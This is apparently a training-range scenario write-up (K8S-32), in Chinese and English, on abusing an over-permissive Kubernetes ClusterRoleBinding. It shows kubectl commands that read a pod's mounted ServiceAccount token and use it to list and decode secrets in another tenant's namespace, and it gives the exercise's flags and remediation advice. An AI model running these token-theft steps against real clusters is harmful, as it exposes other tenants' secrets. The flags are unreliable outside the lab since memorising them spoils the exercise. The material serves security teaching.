# K8S-32 K8s SA Token → 跨命名空间访问

## 场景信息

| 字段 | 值 |
|---|---|
| ID | K8S-32 |
| 名称 | K8s SA Token → Cross-Namespace Access |
| 技术/CVE | N/A (overly permissive RBAC) |
| 难度 | L3 |
| 交付方式 | KIND / Kubernetes |
| 入口 | KIND 集群内入口（无固定宿主端口） |

## 场景概述
tenant-a 的 ServiceAccount 被绑定了过宽的 ClusterRole
（可读 pods/exec/secrets 且跨命名空间）。攻击者拿到该 SA token 后
可跨命名空间读取 tenant-b 的 Secret/执行命令。

## 教材锚点
- 案例：托管 K8s 的 RBAC 过度授权（Ch6）
- 平面：控制面（集群 API）→ 失败边界：命名空间/RBAC
- 六镜头：IDENTITY（SA 自动挂载 token）；BOUNDARY（ClusterRoleBinding
  把租户隔离击穿）

## 前置知识
- SA token；RBAC ClusterRole/ClusterRoleBinding；kubectl

## 利用步骤
1. 进入 tenant-a 的 attacker pod，读取挂载的 SA token。
2. 用 token 调用 K8s API 列出/读取 tenant-b 的 Secret。
3. `kubectl get secret -n tenant-b target-flag` 解码得到 flag。

## Flag
`flag{k8s-32-step2-cross-ns}`

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | KIND, ServiceAccount tokens, namespaces, and RBAC |
| 侦察与前置条件 | Mounted token and cross-namespace authorization discovery |
| 核心漏洞与利用 | Use an over-permitted ServiceAccount token |
| 权限、横向或影响 | Cross-namespace Kubernetes lateral movement |
| 验证 | Read the victim namespace flag |

## 修复建议
RBAC 遵循最小权限与命名空间内绑定（Role/RoleBinding）；
禁止跨命名空间 ClusterRole 绑定。

## Kubernetes 专项利用步骤

## Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (overly permissive RBAC) |
| Difficulty | L3 |
| Type | k8s |
| Path | scenarios/k8s/sa-cross-namespace |

## Attack Path Summary
Compromise pod in tenant-a → extract broad ServiceAccount token → use k8s API to access tenant-b resources → read cross-namespace flag

## Prerequisites
### Knowledge
- Kubernetes RBAC: ServiceAccounts, ClusterRoles, ClusterRoleBindings
- K8s API authentication with bearer tokens
- Namespace isolation and cross-namespace access patterns

### Tools
- kubectl: Kubernetes cluster interaction
- curl: HTTP requests to k8s API

## Step-by-Step Exploitation
### Step 1: Extract SA Token from Attacker Pod
**Flag:** `flag{k8s-32-step1-sa}`

```bash
kubectl exec -it -n tenant-a attacker -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

### Step 2: Use SA Token to Access tenant-b Resources
Use the broad SA token to list secrets and exec into pods in tenant-b.

```bash
TOKEN=$(kubectl exec -n tenant-a attacker -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl get secrets -n tenant-b --token=$TOKEN
kubectl get secret target-flag -n tenant-b -o jsonpath='{.data.flag}' --token=$TOKEN | base64 -d
```

## Flag Location
- Flag: Secret `target-flag` in namespace `tenant-b`

## Verification Commands
```bash
kubectl get clusterrolebinding broad-binding -o yaml
kubectl auth can-i get secrets -n tenant-b --as=system:serviceaccount:tenant-a:broad-sa
```
